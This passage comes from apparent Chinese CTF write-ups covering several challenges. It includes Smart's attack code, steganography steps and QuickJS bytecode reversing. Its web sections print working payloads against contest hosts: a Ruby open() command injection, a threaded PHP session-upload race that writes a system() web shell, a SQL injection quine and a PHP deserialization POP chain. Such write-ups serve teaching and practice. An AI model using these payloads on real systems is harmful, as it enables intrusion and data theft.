int(fac)) dlog = discrete_log(t*Q,t*P,operation=&quot;+&quot;) dlogs += [dlog] print(&quot;factor: &quot;+str(fac)+&quot;, Discrete Log: &quot;+str(dlog))#16093767336603949 可以发现曲线的阶和模数是相同的,采用smart’s attackhttps://wstein.org/edu/2010/414/projects/novotney.pdf paper有代码。 def HenselLift(P,p,prec): E = P.curve() Eq = E.change_ring(QQ) Ep = Eq.change_ring(Qp(p,prec)) x_P,y_P = P.xy() x_lift = ZZ(x_P) y_lift = ZZ(y_P) x, y, a1, a2, a3, a4, a6 = var('x,y,a1,a2,a3,a4,a6') f(a1,a2,a3,a4,a6,x,y) = y^2 + a1*x*y + a3*y - x^3 - a2*x^2 - a4*x - a6 g(y) = f(ZZ(Eq.a1()),ZZ(Eq.a2()),ZZ(Eq.a3()),ZZ(Eq.a4()),ZZ(Eq.a6()),ZZ(x_P),y) gDiff = g.diff() for i in range(1,prec): uInv = ZZ(gDiff(y=y_lift)) u = uInv.inverse_mod(p^i) y_lift = y_lift - u*g(y_lift) y_lift = ZZ(Mod(y_lift,p^(i+1))) y_lift = y_lift+O(p^prec) return Ep([x_lift,y_lift])def SmartAttack(P,Q,p,prec): E = P.curve() Eqq = E.change_ring(QQ) Eqp = Eqq.change_ring(Qp(p,prec)) P_Qp = HenselLift(P,p,prec) Q_Qp = HenselLift(Q,p,prec) p_times_P = p*P_Qp p_times_Q=p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P k = Mod(k,p) return kp = 0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1bA = 0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07B = 0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2E = EllipticCurve(GF(p),[A,B])P=E(10121571443191913072732572831490534620810835306892634555532657696255506898960536955568544782337611042739846570602400973952350443413585203452769205144937861 , 8425218582467077730409837945083571362745388328043930511865174847436798990397124804357982565055918658197831123970115905304092351218676660067914209199149610)Q=E(964864009142237137341389653756165935542611153576641370639729304570649749004810980672415306977194223081235401355646820597987366171212332294914445469010927 , 5162185780511783278449342529269970453734248460302908455520831950343371147566682530583160574217543701164101226640565768860451999819324219344705421407572537)SmartAttack(P,Q,p,8) Misc签到题flag{welcometo5space} alpha10附件得到一个data文件，用foremost分解得到两张图片。00001404.jpg和00001537.png 双图考虑进行盲水印，并且根据题目，设置alpha为10 python3 bwmforpy3.py decode 00001537.png 00001404.jpg flag.png --alpha 10 得到：flag.png 解得图片 flag{XqAe3QzK2ehD5fWv8jfBitPqHUw0} WebPNG图片转换器考点：Ruby open rce 文章：https://blog.heroku.com/identifying-ruby-ftp-cve 文章中提供了一种命令执行的方式 /convert路由刚好满足了条件，直接利用即可。不过要注意的是要以.png结尾，这里可以直接把内容输入到aatao.png；不能用 / 和 .. 不过可以用Linux下的环境变量构造出来 读取根目录文件内容|ls+`echo+$PATH|cut+-c+1`+&gt;aatao.png接着读取aatao.png内容，base64解码即可 接着读取/FLA9_KywXAv78LbopbpBDuWsm的内容 查看aatao.png的内容 EasyCleanup考点：session文件包含 日常考点，直接上脚本 import ioimport requestsimport threadingsess_id = 'Atao'def write(session): while True: f = io.BytesIO(b'a' * 1024 * 128) session.post(url='http://114.115.134.72:32770/', data={'PHP_SESSION_UPLOAD_PROGRESS': 'aaaaasdasdasd&lt;?php system(&quot;cat /flag_is_here_not_are_but_you_find&quot;)?&gt;'}, files={'file': ('atao.txt',f)}, cookies={'PHPSESSID': sess_id} )if __name__==&quot;__main__&quot;: event = threading.Event() session = requests.session() for i in range(1,80): threading.Thread(target=write,args=(session,)).start() 接着访问：http://114.115.134.72:32770/?file=/tmp/sess_Atao即可 yet_another_mysql_injection考点：构造一个select返回的内容与$_POST[‘password’]相同即可 参考文章：https://www.shysecurity.com/post/20140705-SQLi-Quine 这里俺是模仿出来的文章的Payload写的 'union/**/select/**/REPLACE(REPLACE('&quot;union/**/select/**/REPLACE(REPLACE(&quot;^&quot;,CHAR(34),CHAR(39)),CHAR(94),&quot;^&quot;)AS/**/atao#',CHAR(34),CHAR(39)),CHAR(94),'&quot;union/**/select/**/REPLACE(REPLACE(&quot;^&quot;,CHAR(34),CHAR(39)),CHAR(94),&quot;^&quot;)AS/**/atao#')AS/**/atao# 主要是利用REPLACE替换函数将内容换成来完成**$_POST[‘password’]==$row[‘password’]** &quot;union/**/select/**/REPLACE(REPLACE(&quot;^&quot;,CHAR(34),CHAR(39)),CHAR(94),&quot;^&quot;)AS/**/atao#第一次REPLACE'union/**/select/**/REPLACE(REPLACE('^',CHAR(34),CHAR(39)),CHAR(94),'^')AS/**/atao#第二次REPLACE'union/**/select/**/REPLACE(REPLACE('&quot;union/**/select/**/REPLACE(REPLACE(&quot;^&quot;,CHAR(34),CHAR(39)),CHAR(94),&quot;^&quot;)AS/**/atao#',CHAR(34),CHAR(39)),CHAR(94),'&quot;union/**/select/**/REPLACE(REPLACE(&quot;^&quot;,CHAR(34),CHAR(39)),CHAR(94),&quot;^&quot;)AS/**/atao#')AS/**/atao# WebFTP找源码：https://github.com/wifeat/WebFTP flag在phpinfo中有，感觉是非预期了 pklovecloud考点：构造POP链 &lt;?phpclass acp{ protected $cinder; public $neutron; public $nova; function __construct($cinder){ $this-&gt;nova = &amp;$this-&gt;neutron; $this-&gt;cinder = $cinder; }}class ace{ public $filename = &quot;flag.php&quot;; public $openstack; public $docker; function __construct($docker){ $this-&gt;docker = $docker; }}echo urlencode(serialize(new acp(new ace(serialize(new acp(&quot;&quot;)))))); 访问：view-source:http://122.112.141.64:45852/?pks=O%3A3%3A”acp”%3A3%3A{s%3A9%3A”*cinder”%3BO%3A3%3A”ace”%3A3%3A{s%3A8%3A”filename”%3Bs%3A8%3A”flag.php”%3Bs%3A9%3A”openstack”%3BN%3Bs%3A6%3A”docker”%3Bs%3A68%3A”O%3A3%3A”acp”%3A3%3A{s%3A9%3A”*cinder”%3Bs%3A0%3A””%3Bs%3A7%3A”neutron”%3BN%3Bs%3A4%3A”nova”%3BR%3A3%3B}”%3B}s%3A7%3A”neutron”%3BN%3Bs%3A4%3A”nova”%3BR%3A6%3B}","link":"/posts/56002/"},{"title":"2021第一届长城杯网络安全大赛WP","text":"第一届“长城杯”网络安全大赛 - 院校组 - 不是睡就是吃 WP 成绩 Misc签到16进制的ascii+base64，手速是吧，直接一血。 flag{Welcome_to_changchengbe1} 你这flag保熟吗前面不说了，两张图片尾部都有rar，提取出来一个hint和一个password的表格，hint给了16位的base64，加密之后和表格比较，发现 (别问为什么模糊，问就是因为先在CSDN写的) 哦~，原来是希尔伯特曲线观察和写脚本经历了长达1个多小时的斗争。用希尔伯特曲线来提取此表格的脚本如下。（根据百度） from hilbertcurve.hilbertcurve import HilbertCurveimport xlrdreadbook = xlrd.open_workbook('password.xls')sheet = readbook.sheet_by_index(0)f = open('base64.txt','w+')hilbert_curve = HilbertCurve(17, 2)base64 = ''for i in range(65536): [j,k] = hilbert_curve.point_from_distance(i) base64 += sheet.cell(j,k).valuef.write(base64) 然后将base64，n次解码 (别问为什么有水印，问就是因为先写的CSDN) 密码为1f_y0u_h4ve_7he_fllllllag,_I_muSt_vvant_1t!解压rar，得到flag.phpbrainfuck，但是怎么弄都是输出error，障眼法是吧。观察了之后发现前面所有的.(点)都被出题人删了，而作用是输出指针指向的单元内容，所以前面那一长串都无法输出，值只能被保留在对应单元中。好在github搜brainfuck第一个就可以看到每个单元里面的信息，虽然写脚本也行，但是人都挺懒https://fatiherikli.github.io/brainfuck-visualizer用这个，勾选上Optimize?，delay调到最低但是其实你还会发现一个问题，单元格只有20多个，额外的没法输出这时只需要凭感觉将前面部分去掉，然后重新跑就行，找交集就能知道整个链子应该是哪样的了得到s = [117,111,122,116,123,83,114,82,121,118,105,103,95,88,102,105,101,118,95,49,72,95,52,95,101,101,48,109,119,118,105,117,102,33,95,120,102,105,101,118,125]然后输出发现是uozt{SrRyvig_Xfiev_1H_4_ee0mwviuf!_xfiev}然后atbash flag{HiIbert_Curve_1S_4_vv0nderfu!_curve} reJust_cmp-re类原题的改编题[Zer0pts2020]easy strcmp自己跟着复现这道题就完事脚本如下 enc = 'flag{********************************}'m = [0x0A07370000000000, 0x380B06060A080A37, 0x3B0F0E38083B0A07,0x373B0709060B0A3A,0x0F38070F0D]import binasciiflag = b&quot;&quot; # 由于是字节操作，需要在前面加上bfor i in range(5): p = enc[i * 8:(i + 1) * 8] # 将enc字符串8位一组分开 print(p) a = binascii.b2a_hex(p.encode('ascii')[::-1]) # 将分开后的字符串转每一位转换成ascii，然后逆序 print(a) b = binascii.a2b_hex(hex(int(a, 16) + m[i])[2:])[::-1] # （enc[i]的ascii+m[i]）的结果是16进制，[2::]是舍弃开头的0x，然后[::-1]逆序 print(b) print('\\n') flag += b # 拼凑每组还原后的结果print(flag) flag{a14a424005b14e2b89ed45031ea791b9} Funny_js该题WP来自战队成员，未参加本次比赛团队解题，放出WP供于学习 来自1u1u 考点：quickjs、bytecode 、rc4. quickjs写的程序。 下载源码，注意版本要为 quickjs-2020-01-19.tar.xz 然后解压后要修改quickjs.c里面的源码，使得起输出字节码。 先编译一个.c程序 在example里面有样本js文件，进到该目录， qjsc -e -o hello.c hello.js 得到hello.c文件 /* File generated automatically by the QuickJS compiler. */#include &quot;quickjs-libc.h&quot;const uint32_t qjsc_hello_size = 78;const uint8_t qjsc_hello[78] = { 0x02, 0x04, 0x0e, 0x63, 0x6f, 0x6e, 0x73, 0x6f, 0x6c, 0x65, 0x06, 0x6c, 0x6f, 0x67, 0x16, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64, 0x10, 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x2e, 0x6a, 0x73, 0x0e, 0x00, 0x06, 0x00, 0x9e, 0x01, 0x00, 0x01, 0x00, 0x03, 0x00, 0x00, 0x14, 0x01, 0xa0, 0x01, 0x00, 0x00, 0x00, 0x39, 0xdf, 0x00, 0x00, 0x00, 0x43, 0xe0, 0x00, 0x00, 0x00, 0x04, 0xe1, 0x00, 0x00, 0x00, 0x24, 0x01, 0x00, 0xcf, 0x28, 0xc4, 0x03, 0x01, 0x00,};int main(int argc, char **argv){ JSRuntime *rt; JSContext *ctx; rt = JS_NewRuntime(); ctx = JS_NewContextRaw(rt); JS_SetModuleLoaderFunc(rt, NULL, js_module_loader, NULL); JS_AddIntrinsicBaseObjects(ctx); JS_AddIntrinsicDate(ctx); JS_AddIntrinsicEval(ctx); JS_AddIntrinsicStringNormalize(ctx); JS_AddIntrinsicRegExp(ctx); JS_AddIntrinsicJSON(ctx); JS_AddIntrinsicProxy(ctx); JS_AddIntrinsicMapSet(ctx); JS_AddIntrinsicTypedArrays(ctx); JS_AddIntrinsicPromise(ctx); JS_AddIntrinsicBigInt(ctx); js_std_add_helpers(ctx, argc, argv); js_std_eval_binary(ctx, qjsc_hello, qjsc_hello_size, 0); js_std_loop(ctx); JS_FreeContext(ctx); JS_FreeRuntime(rt); return 0;} 然后再我们的题目文件拷贝出qjsc_s数组，并计算数组大小。 修改上面的代码 最终 hello.c #include &quot;quickjs-libc.h&quot; const uint32_t qjsc_hello_size = 1164; const uint8_t qjsc_hello[1164] = { 0x02, 0x1B, 0x06, 0x72, 0x63, 0x34, 0x04, 0x73, 0x6E, 0x02, 0x69, 0x02, 0x6A, 0x02, 0x6B, 0x02, 0x6C, 0x02, 0x6D, 0x02, 0x6E, 0x04, 0x75, 0x6E, 0x06, 0x61, 0x72, 0x72, 0x0C, 0x63, 0x69, 0x70, 0x68, 0x65, 0x72, 0x2A, 0x32, 0x30, 0x32, 0x31, 0x71, 0x75, 0x69, 0x63, 0x6B, 0x6A, 0x73, 0x5F, 0x68, 0x61, 0x70, 0x70, 0x79, 0x67, 0x61, 0x6D, 0x65, 0x48, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x02, 0x73, 0x18, 0x66, 0x72, 0x6F, 0x6D, 0x43, 0x68, 0x61, 0x72, 0x43, 0x6F, 0x64, 0x65, 0x0A, 0x70, 0x72, 0x69, 0x6E, 0x74, 0x12, 0x73, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x2E, 0x6A, 0x73, 0x08, 0x64, 0x61, 0x74, 0x61, 0x06, 0x6B, 0x65, 0x79, 0x06, 0x62, 0x6F, 0x78, 0x02, 0x78, 0x08, 0x74, 0x65, 0x6D, 0x70, 0x02, 0x79, 0x06, 0x6F, 0x75, 0x74, 0x08, 0x63, 0x6F, 0x64, 0x65, 0x14, 0x63, 0x68, 0x61, 0x72, 0x43, 0x6F, 0x64, 0x65, 0x41, 0x74, 0x08, 0x70, 0x75, 0x73, 0x68, 0x0E, 0x00, 0x06, 0x00, 0x9E, 0x01, 0x00, 0x01, 0x00, 0x20, 0x00, 0x08, 0xEB, 0x04, 0x01, 0xA0, 0x01, 0x00, 0x00, 0x00, 0x40, 0xDF, 0x00, 0x00, 0x00, 0x40, 0x40, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x40, 0xE1, 0x00, 0x00, 0x00, 0x00, 0x40, 0xE2, 0x00, 0x00, 0x00, 0x00, 0x40, 0xE3, 0x00, 0x00, 0x00, 0x00, 0x40, 0xE4, 0x00, 0x00, 0x00, 0x00, 0x40, 0xE5, 0x00, 0x00, 0x00, 0x00, 0x40, 0xE6, 0x00, 0x00, 0x00, 0x00, 0x40, 0xE7, 0x00, 0x00, 0x00, 0x00, 0x40, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x40, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x40, 0xE1, 0x00, 0x00, 0x00, 0x00, 0xC2, 0x00, 0x41, 0xDF, 0x00, 0x00, 0x00, 0x00, 0x3F, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x3F, 0xE1, 0x00, 0x00, 0x00, 0x00, 0x3F, 0xE2, 0x00, 0x00, 0x00, 0x00, 0x3F, 0xE3, 0x00, 0x00, 0x00, 0x00, 0x3F, 0xE4, 0x00, 0x00, 0x00, 0x00, 0x3F, 0xE5, 0x00, 0x00, 0x00, 0x00, 0x3F, 0xE6, 0x00, 0x00, 0x00, 0x00, 0x3F, 0xE7, 0x00, 0x00, 0x00, 0x00, 0x3F, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x3F, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x3F, 0xE1, 0x00, 0x00, 0x00, 0x00, 0x04, 0xEA, 0x00, 0x00, 0x00, 0x11, 0x3A, 0xE7, 0x00, 0x00, 0x00, 0x0E, 0x04, 0xEB, 0x00, 0x00, 0x00, 0x11, 0x3A, 0xE0, 0x00, 0x00, 0x00, 0xCB, 0xC0, 0x96, 0x00, 0xC0, 0xE0, 0x00, 0xC0, 0xF4, 0x00, 0xBF, 0x44, 0xBF, 0x3D, 0xBF, 0x7D, 0xBF, 0x08, 0xC0, 0xEF, 0x00, 0xC0, 0xCB, 0x00, 0xC0, 0xFE, 0x00, 0xC0, 0xF1, 0x00, 0xBF, 0x71, 0xC0, 0xD5, 0x00, 0xC0, 0xB0, 0x00, 0xBF, 0x40, 0xBF, 0x6A, 0xBF, 0x67, 0xC0, 0xA6, 0x00, 0xC0, 0xB9, 0x00, 0xC0, 0x9F, 0x00, 0xC0, 0x9E, 0x00, 0xC0, 0xAC, 0x00, 0xBF, 0x09, 0xC0, 0xD5, 0x00, 0xC0, 0xEF, 0x00, 0xBF, 0x0C, 0xBF, 0x64, 0xC0, 0xB9, 0x00, 0xBF, 0x5A, 0xC0, 0xAE, 0x00, 0xBF, 0x6B, 0xC0, 0x83, 0x00, 0x26, 0x20, 0x00, 0xC0, 0xDF, 0x00, 0x4D, 0x20, 0x00, 0x00, 0x80, 0xBF, 0x7A, 0x4D, 0x21, 0x00, 0x00, 0x80, 0xC0, 0xE5, 0x00, 0x4D, 0x22, 0x00, 0x00, 0x80, 0xC0, 0x9D, 0x00, 0x4D, 0x23, 0x00, 0x00, 0x80, 0x11, 0x3A, 0xE8, 0x00, 0x00, 0x00, 0x0E, 0xC1, 0x01, 0x11, 0x3A, 0xE5, 0x00, 0x00, 0x00, 0xCB, 0xC1, 0x02, 0x11, 0x3A, 0xE6, 0x00, 0x00, 0x00, 0xCB, 0xB7, 0x11, 0x3A, 0xE4, 0x00, 0x00, 0x00, 0xCB, 0xB7, 0x11, 0x3A, 0xE3, 0x00, 0x00, 0x00, 0xCB, 0x39, 0xDF, 0x00, 0x00, 0x00, 0x39, 0xE0, 0x00, 0x00, 0x00, 0x39, 0xE7, 0x00, 0x00, 0x00, 0xF2, 0x11, 0x3A, 0xE9, 0x00, 0x00, 0x00, 0x0E, 0x06, 0xCB, 0xB7, 0x11, 0x3A, 0xE1, 0x00, 0x00, 0x00, 0x0E, 0x39, 0xE1, 0x00, 0x00, 0x00, 0x39, 0xE9, 0x00, 0x00, 0x00, 0xEB, 0xA5, 0xEC, 0x6E, 0x39, 0xE9, 0x00, 0x00, 0x00, 0x39, 0xE1, 0x00, 0x00, 0x00, 0x48, 0x11, 0x3A, 0xE2, 0x00, 0x00, 0x00, 0xCB, 0x39, 0xE2, 0x00, 0x00, 0x00, 0xBF, 0x38, 0xBF, 0x11, 0xA0, 0xB0, 0x11, 0x3A, 0xE4, 0x00, 0x00, 0x00, 0xCB, 0x06, 0xCB, 0x39, 0xE4, 0x00, 0x00, 0x00, 0x39, 0xE8, 0x00, 0x00, 0x00, 0x39, 0xE3, 0x00, 0x00, 0x00, 0x48, 0xAB, 0xEC, 0x0F, 0x39, 0xE5, 0x00, 0x00, 0x00, 0x93, 0x3A, 0xE5, 0x00, 0x00, 0x00, 0xCB, 0xEE, 0x0D, 0x39, 0xE6, 0x00, 0x00, 0x00, 0x93, 0x3A, 0xE6, 0x00, 0x00, 0x00, 0xCB, 0x39, 0xE3, 0x00, 0x00, 0x00, 0x93, 0x3A, 0xE3, 0x00, 0x00, 0x00, 0xCB, 0x39, 0xE1, 0x00, 0x00, 0x00, 0x93, 0x3A, 0xE1, 0x00, 0x00, 0x00, 0x0E, 0xEE, 0x86, 0x06, 0xCB, 0x39, 0xE5, 0x00, 0x00, 0x00, 0x39, 0xE9, 0x00, 0x00, 0x00, 0xEB, 0xAB, 0xEC, 0x15, 0x39, 0xE6, 0x00, 0x00, 0x00, 0xB7, 0xAB, 0xEC, 0x0C, 0xC1, 0x03, 0x11, 0x3A, 0xE6, 0x00, 0x00, 0x00, 0xCB, 0xEE, 0x0A, 0xC1, 0x04, 0x11, 0x3A, 0xE6, 0x00, 0x00, 0x00, 0xCB, 0xC3, 0x11, 0x3A, 0xEC, 0x00, 0x00, 0x00, 0xCB, 0x06, 0xCB, 0x39, 0xE6, 0x00, 0x00, 0x00, 0xC1, 0x05, 0xA7, 0xEC, 0x3A, 0x39, 0xEC, 0x00, 0x00, 0x00, 0x39, 0x97, 0x00, 0x00, 0x00, 0x43, 0xED, 0x00, 0x00, 0x00, 0x39, 0x96, 0x00, 0x00, 0x00, 0x39, 0xE6, 0x00, 0x00, 0x00, 0xC1, 0x06, 0x9E, 0xF1, 0x24, 0x01, 0x00, 0x9F, 0x11, 0x3A, 0xEC, 0x00, 0x00, 0x00, 0xCB, 0x39, 0xE6, 0x00, 0x00, 0x00, 0xC1, 0x07, 0x9D, 0x11, 0x3A, 0xE6, 0x00, 0x00, 0x00, 0xCB, 0xEE, 0xBE, 0x39, 0xEE, 0x00, 0x00, 0x00, 0x39, 0xEC, 0x00, 0x00, 0x00, 0xF1, 0xCF, 0x28, 0xDE, 0x03, 0x01, 0x20, 0x00, 0x48, 0x01, 0x00, 0x4A, 0x52, 0x3F, 0x40, 0x00, 0x7C, 0x04, 0x30, 0x30, 0x2B, 0x2B, 0x77, 0x7B, 0x5D, 0x5D, 0x6C, 0x3F, 0x0E, 0x40, 0x3F, 0x4A, 0xB7, 0x30, 0x2B, 0x3F, 0xCB, 0x4E, 0x0D, 0x0E, 0x43, 0x06, 0x00, 0xBE, 0x03, 0x02, 0x08, 0x02, 0x05, 0x00, 0x00, 0xBB, 0x01, 0x0A, 0xE0, 0x03, 0x00, 0x01, 0x00, 0xE2, 0x03, 0x00, 0x01, 0x00, 0xE4, 0x03, 0x00, 0x00, 0x00, 0xC2, 0x03, 0x00, 0x01, 0x00, 0xE6, 0x03, 0x00, 0x02, 0x00, 0xE8, 0x03, 0x00, 0x03, 0x00, 0xEA, 0x03, 0x00, 0x04, 0x00, 0xEC, 0x03, 0x00, 0x05, 0x00, 0xEE, 0x03, 0x00, 0x06, 0x00, 0xC6, 0x03, 0x00, 0x07, 0x00, 0x39, 0x94, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x01, 0xF1, 0xCB, 0xB7, 0xCC, 0xC8, 0xC0, 0x00, 0x01, 0xA5, 0xEC, 0x09, 0xC7, 0xC8, 0xC8, 0x4A, 0x95, 0x01, 0xEE, 0xF2, 0xB7, 0xCD, 0xB7, 0xCC, 0xC8, 0xC0, 0x00, 0x01, 0xA5, 0xEC, 0x2C, 0xC9, 0xC7, 0xC8, 0x48, 0x9F, 0xD4, 0x43, 0xF8, 0x00, 0x00, 0x00, 0xC8, 0xD4, 0xEB, 0x9E, 0x24, 0x01, 0x00, 0x9F, 0xC0, 0x00, 0x01, 0x9E, 0xCD, 0xC7, 0xC8, 0x48, 0xCE, 0xC7, 0xC8, 0x72, 0xC7, 0xC9, 0x48, 0x4A, 0xC7, 0xC9, 0xCA, 0x4A, 0x95, 0x01, 0xEE, 0xCF, 0xB7, 0xCD, 0xB7, 0xC5, 0x04, 0x26, 0x00, 0x00, 0xC5, 0x05, 0xB7, 0xCC, 0xC8, 0xD3, 0xEB, 0xA5, 0xEC, 0x56, 0xD3, 0x43, 0xF8, 0x00, 0x00, 0x00, 0xC8, 0x24, 0x01, 0x00, 0xC5, 0x06, 0xC9, 0xB8, 0x9F, 0xC0, 0x00, 0x01, 0x9E, 0xCD, 0xC4, 0x04, 0xC7, 0xC9, 0x48, 0x9F, 0xC0, 0x00, 0x01, 0x9E, 0xC5, 0x04, 0xC7, 0xC9, 0x48, 0xCE, 0xC7, 0xC9, 0x72, 0xC7, 0xC4, 0x04, 0x48, 0x4A, 0xC7, 0xC4, 0x04, 0xCA, 0x4A, 0xC7, 0xC9, 0x48, 0xC7, 0xC4, 0x04, 0x48, 0x9F, 0xC0, 0x00, 0x01, 0x9E, 0xC5, 0x07, 0xC4, 0x05, 0x43, 0xF9, 0x00, 0x00, 0x00, 0xC4, 0x06, 0xC7, 0xC4, 0x07, 0x48, 0xB0, 0x24, 0x01, 0x00, 0x0E, 0x95, 0x01, 0xEE, 0xA6, 0xC4, 0x05, 0x28, 0xDE, 0x03, 0x03, 0x19, 0x04, 0x35, 0x30, 0x17, 0x18, 0x0D, 0x30, 0x7B, 0x17, 0x26, 0x17, 0x19, 0x0D, 0x12, 0x1C, 0x2C, 0x40, 0x2B, 0x3F, 0x17, 0x2B, 0x1D, 0x4A, 0x5D, 0x17, 0x0A, 0x00, 0x0A, 0x00, 0x0A, 0xE8, 0x01, 0x07, 0x44, 0xB8, 0x90, 0xB5, 0x6B, 0x67, 0x80, 0x0A, 0xE8, 0x01, 0x07, 0x34, 0xA7, 0xB8, 0x48, 0x7F, 0x8D, 0xAF, 0x0A, 0x00, 0x0A, 0x28, 0x01, 0xFE, 0x0A, 0x28, 0x01,0xfe}; int main(int argc, char **argv){ JSRuntime *rt; JSContext *ctx; rt = JS_NewRuntime(); ctx = JS_NewContextRaw(rt); JS_SetModuleLoaderFunc(rt, NULL, js_module_loader, NULL); JS_AddIntrinsicBaseObjects(ctx); JS_AddIntrinsicDate(ctx); JS_AddIntrinsicEval(ctx); JS_AddIntrinsicStringNormalize(ctx); JS_AddIntrinsicRegExp(ctx); JS_AddIntrinsicJSON(ctx); JS_AddIntrinsicProxy(ctx); JS_AddIntrinsicMapSet(ctx); JS_AddIntrinsicTypedArrays(ctx); JS_AddIntrinsicPromise(ctx); JS_AddIntrinsicBigInt(ctx); js_std_add_helpers(ctx, argc, argv); js_std_eval_binary(ctx, qjsc_hello, qjsc_hello_size, 0); js_std_loop(ctx); JS_FreeContext(ctx); JS_FreeRuntime(rt); return 0;} 然后使用编译 gcc -ggdb hello.c libquickjs.a -lm -ldl -lpthread 得到一个a.out 文件 输出重定位一下 ./a.out &gt;1.txt 得到 1.txt 0000: 02 1b 27 atom indexes {0002: 06 72 63 34 string: 1&quot;rc4&quot;0006: 04 73 6e string: 1&quot;sn&quot;0009: 02 69 string: 1&quot;i&quot;000b: 02 6a string: 1&quot;j&quot;000d: 02 6b string: 1&quot;k&quot;000f: 02 6c string: 1&quot;l&quot;0011: 02 6d string: 1&quot;m&quot;0013: 02 6e string: 1&quot;n&quot;0015: 04 75 6e string: 1&quot;un&quot;0018: 06 61 72 72 string: 1&quot;arr&quot;001c: 0c 63 69 70 68 65 72 string: 1&quot;cipher&quot;0023: 2a 32 30 32 31 71 75 69 63 6b 6a 73 5f 68 61 70 70 79 67 61 6d 65 string: 1&quot;2021quickjs_happygame&quot;0039: 48 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a string: 1&quot;************************************&quot;005e: 02 73 string: 1&quot;s&quot;0060: 18 66 72 6f 6d 43 68 61 72 43 6f 64 65 string: 1&quot;fromCharCode&quot;006d: 0a 70 72 69 6e 74 string: 1&quot;print&quot;0073: 12 73 6f 75 72 63 65 2e 6a 73 string: 1&quot;source.js&quot;007d: 08 64 61 74 61 string: 1&quot;data&quot;0082: 06 6b 65 79 string: 1&quot;key&quot;0086: 06 62 6f 78 string: 1&quot;box&quot;008a: 02 78 string: 1&quot;x&quot;008c: 08 74 65 6d 70 string: 1&quot;temp&quot;0091: 02 79 string: 1&quot;y&quot;0093: 06 6f 75 74 string: 1&quot;out&quot;0097: 08 63 6f 64 65 string: 1&quot;code&quot;009c: 14 63 68 61 72 43 6f 64 65 41 74 string: 1&quot;charCodeAt&quot;00a7: 08 70 75 73 68 string: 1&quot;push&quot; }00ac: 0e function {00ad: 00 06 00 9e 01 00 01 00 20 00 08 eb 04 01 name: &quot;&lt;eval&gt;&quot; args=0 vars=1 defargs=0 closures=0 cpool=8 stack=32 bclen=619 locals=1 vars {00bb: a0 01 00 00 00 name: &quot;&lt;ret&gt;&quot; } bytecode {00c0: 40 df 00 00 00 40 40 e0 00 00 00 00 40 e1 00 00 00 00 40 e2 00 00 00 00 40 e3 00 00 00 00 40 e4 00 00 00 00 40 e5 00 00 00 00 40 e6 00 00 00 00 40 e7 00 00 00 00 40 e8 00 00 00 00 40 e9 00 00 00 00 40 e1 00 00 00 00 c2 00 41 df 00 00 00 00 3f e0 00 00 00 00 3f e1 00 00 00 00 3f e2 00 00 00 00 3f e3 00 00 00 00 3f e4 00 00 00 00 3f e5 00 00 00 00 3f e6 00 00 00 00 3f e7 00 00 00 00 3f e8 00 00 00 00 3f e9 00 00 00 00 3f e1 00 00 00 00 04 ea 00 00 00 11 3a e7 00 00 00 0e 04 eb 00 00 00 11 3a e0 00 00 00 cb c0 96 00 c0 e0 00 c0 f4 00 bf 44 bf 3d bf 7d bf 08 c0 ef 00 c0 cb 00 c0 fe 00 c0 f1 00 bf 71 c0 d5 00 c0 b0 00 bf 40 bf 6a bf 67 c0 a6 00 c0 b9 00 c0 9f 00 c0 9e 00 c0 ac 00 bf 09 c0 d5 00 c0 ef 00 bf 0c bf 64 c0 b9 00 bf 5a c0 ae 00 bf 6b c0 83 00 26 20 00 c0 df 00 4d 20 00 00 80 bf 7a 4d 21 00 00 80 c0 e5 00 4d 22 00 00 80 c0 9d 00 4d 23 00 00 80 11 3a e8 00 00 00 0e c1 01 11 3a e5 00 00 00 cb c1 02 11 3a e6 00 00 00 cb b7 11 3a e4 00 00 00 cb b7 11 3a e3 00 00 00 cb 39 df 00 00 00 39 e0 00 00 00 39 e7 00 00 00 f2 11 3a e9 00 00 00 0e 06 cb b7 11 3a e1 00 00 00 0e 39 e1 00 00 00 39 e9 00 00 00 eb a5 ec 6e 39 e9 00 00 00 39 e1 00 00 00 48 11 3a e2 00 00 00 cb 39 e2 00 00 00 bf 38 bf 11 a0 b0 11 3a e4 00 00 00 cb 06 cb 39 e4 00 00 00 39 e8 00 00 00 39 e3 00 00 00 48 ab ec 0f 39 e5 00 00 00 93 3a e5 00 00 00 cb ee 0d 39 e6 00 00 00 93 3a e6 00 00 00 cb 39 e3 00 00 00 93 3a e3 00 00 00 cb 39 e1 00 00 00 93 3a e1 00 00 00 0e ee 86 06 cb 39 e5 00 00 00 39 e9 00 00 00 eb ab ec 15 39 e6 00 00 00 b7 ab ec 0c c1 03 11 3a e6 00 00 00 cb ee 0a c1 04 11 3a e6 00 00 00 cb c3 11 3a ec 00 00 00 cb 06 cb 39 e6 00 00 00 c1 05 a7 ec 3a 39 